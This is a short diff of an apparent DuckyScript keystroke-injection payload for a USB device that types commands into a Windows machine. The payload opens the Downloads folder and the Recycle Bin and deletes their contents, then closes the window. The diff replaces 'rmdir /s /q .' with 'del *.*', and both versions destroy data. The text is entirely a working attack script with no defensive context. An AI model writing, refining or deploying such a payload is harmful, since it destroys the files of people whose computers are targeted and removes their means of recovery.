@@ -12,13 +12,13 @@ DELAY 250
 STRING cd Downloads
 ENTER
 DELAY 1
-STRING rmdir /s /q .
+STRING del *.*
 ENTER
 DELAY 125
 STRING cd C:\$Recycle.bin
 ENTER
 DELAY 25
-STRING rmdir /s /q .
+STRING del *.*
 ENTER
 DELAY 125
 ALT F4
